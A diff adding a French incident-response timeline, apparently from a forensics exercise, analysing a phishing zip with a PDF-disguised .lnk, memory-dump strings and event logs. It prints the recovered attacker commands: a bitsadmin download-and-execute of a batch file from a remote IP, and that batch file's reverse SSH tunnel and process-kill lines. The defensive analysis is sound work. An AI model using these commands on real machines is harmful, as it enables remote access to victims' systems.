@@ -1,0 +1,103 @@
+# TIMELINE
+
+## 28/02/2024
+
+### Mail
+
+Mail suspicieux d'Homer Simpson
+
+![alt text](image.png)
+
+Le mail redirige vers une archive zip et non un PDF
+
+`http://13.39.205.164/CV_Homer_SIMPSON.zip`
+
+C'est un serveur WEB qui tourne derrière cette IP.
+
+### Analyse du Dump Mémoire | strings
+
+On retrouve dans les strings une connexion SSH forward, un tunnel est crée entre la machine et le serveur vu précedemment.
+
+```bash
+ssh  -o StrictHostKeyChecking=no -f -N -R 1080 tunnel@13.39.205.164 -p 443
+
+-f foreground
+-o option -> StrictHostKeyChecking=no
+-N pas d'exec de commande
+-R port à forwarder
+-p port vers lequel on forward
+```
+
+Extraction de données ?
+
+### Processus: cmd.exe
+
+On retrouve dans la liste des processus plusieurs cmd.exe
+
+- 1 dumpit (pid 11256)
+- 1 Générator de menace (pid 7072)
+- 1 soupçoné d'être notre malware (pid 5728)
+
+On retrouve dans la mémoire du cmd, ce que l'on soupçonne d'être le script malveillant (.bat)
+`strings pid.5728.dmp | grep "echo off" -A 10 -B 10`
+
+```bat
+@echo off
+start http://13.39.205.164/CV_Homer_SIMPSON.pdf
+start /min ssh -o StrictHostKeyChecking=no -f -N -R 1080 tunnel:tunnel@13.39.205.164 -p 443
+wmic process where "name='cmd.exe'" delete
+exit
+```
+
+wmic process where... doit servir à supprimer instantanément le cmd
+Ce programme .bat est probablement télécharge après l'ouverture d'un des fichiers dans l'archive, puisque l'on retrouve cette ligne dans les strings du dump mémoire:
+
+![alt text](image-1.png)
+
+Il y a donc un téléchargement du fichier `autologon.bat` depuis le serveur web et l'execution de celui-ci. Le code retrouvé précedemment est probablement le contenu de ce .bat.
+
+On retrouve également sur la machine un programme étrange du nom de **bInckFhm.exe** au PID 440 que je n'ai pas pu décompilé.
+
+## 29/02/2024
+
+### Analyse evtx
+
+Avec l'outil Chainsaw j'applique des sigma rules pour trier les logs evtx et les exporter en CSV.
+
+On retrouve la création d'un utilisateur: `lisa.simpson`
+
+![alt text](image-2.png)
+
+On cherchant dans les strings, on retrouve la création de cet utilisateur ainsi que l'ajout de ce dernier au groupe "administrateurs"
+
+![alt text](image-3.png)
+
+On retrouve ces informations dans les logs evtx ouvert dans windows.
+
+### Analyse des pièces jointes présentes sur le serveur web
+
+On a pu récupérer les fichiers ZIP et autologon.bat présent sur le serveur WEB.
+
+![alt text](image-4.png)
+
+Le ZIP contient un .lnk qui est un raccourci avec une icone de pdf et il continent également le vrai CV d'Homer Simpson.
+
+Dans le .lnk, on remarque l'execution d'une commande dans un CMD:
+
+![alt text](image-5.png)
+
+```bat
+"C:\Windows\System32\cmd.exe" /k "bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "http://13.39.205.164/autologon.bat" "c:\users\public\autologon.bat" && start c:\users\public\autologon.bat && exit"
+```
+
+C'est la commande qui télécharge l'autologon.bat. Ce dernier contient le programme suivant:
+
+```bat
+@echo off
+start http://13.39.205.164/CV_Homer_SIMPSON.pdf
+start /min ssh -o StrictHostKeyChecking=no -f -N -R 1080 tunnel:tunnel@13.39.205.164 -p 443
+wmic process where "name='cmd.exe'" delete
+exit
+```
+
+C'est bien le programme que j'avais trouvé hier dans les strings.
